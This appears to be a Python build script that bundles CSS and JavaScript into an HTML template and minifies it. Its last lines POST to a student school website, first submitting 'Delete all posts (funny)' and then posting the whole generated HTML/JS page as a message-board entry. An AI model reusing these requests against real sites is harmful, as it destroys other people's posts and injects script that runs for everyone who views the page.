# pylint: disable=missing-docstring,import-error
from pathlib import Path
import re
import requests

root = Path(__file__).parent

css = ""
for css_file in root.joinpath("css/").rglob("*"):
    if css_file.is_file():
        css += "\n\n" + css_file.read_text(encoding="utf-8")

JS_LOAD = re.compile(r"function\s*onload\s*\(\s*\)\s*\{(.*)\}", re.DOTALL)
JS_LINE = re.compile(
    r"(?<![/+*-|&;{}[\],:(\s])(\s*)$([\s\n]*)(?![\s\n\.)}\]/+*-|&])", re.M)
JS_COMMENT = re.compile(r"//\s*(.*)$", re.MULTILINE)
init_js = ""
load_js = ""
for js_file in root.joinpath("js/").rglob("*"):
    if js_file.is_file():
        content = js_file.read_text(encoding="utf-8")
        if (match := JS_LOAD.search(content)) is not None:
            load_js += f"\n((/* {js_file.name} */) => {{{match.group(1)}}})();"
        init_js += f"\n/* {js_file.name} */\n{JS_LOAD.sub("", content)}"

init_js = JS_LINE.sub(
    lambda m: f"{m.group(1)};{m.group(2)}",
    JS_COMMENT.sub(lambda m: f"/* {m.group(1)} */", init_js))
load_js = JS_LINE.sub(
    lambda m: f"{m.group(1)};{m.group(2)}",
    JS_COMMENT.sub(lambda m: f"/* {m.group(1)} */", load_js))

output = root.joinpath("template.html").read_text("utf-8")
output = output.replace("{css}", f"BEGIN CSS */{css}/* END CSS")
output = output.replace(
    "{init_js}", f"BEGIN INIT JS */{init_js}/* END INIT JS")
output = output.replace(
    "{load_js}", f"BEGIN LOAD JS */{load_js}/* END LOAD JS")

output = re.sub(r"\s+", " ", output)

root.joinpath("output.html").write_text(output, encoding="utf-8")

requests.post(
    "http://chestetj20.student.cashmere.school.nz/",
    data={"submit": "Delete all posts (funny)"},
    timeout=10)
requests.post(
    "http://chestetj20.student.cashmere.school.nz/index.php",
    data={"message_info": output},
    timeout=10)
